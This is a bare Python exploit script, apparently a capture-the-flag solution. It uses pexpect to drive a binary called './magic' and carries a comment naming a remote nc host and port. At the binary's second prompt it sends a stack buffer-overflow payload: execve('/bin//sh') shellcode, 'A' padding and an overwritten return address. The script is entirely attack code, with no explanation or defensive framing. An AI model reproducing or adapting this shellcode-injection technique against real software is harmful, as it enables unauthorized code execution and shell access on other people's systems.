import sys
import pexpect


def main():
    # nc 140.113.209.24 10000
    child = pexpect.spawn('./magic')
    child.logfile = sys.stdout
    child.expect(':')
    if child.before is not None:
        s = '12345'
        child.sendline(s)
    child.expect(':')
    if child.before is not None:
        # buf -> ebp -> ret
        s = '\x48\x31\xd2\x52\xb0\x3b\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x8d\x3c\x24\x0f\x05' + 'A'*(60-23+4*2) + '\x36\x88\x04\x08'
        child.sendline(s)
        child.expect(pexpect.EOF)


if __name__ == '__main__':
    main()
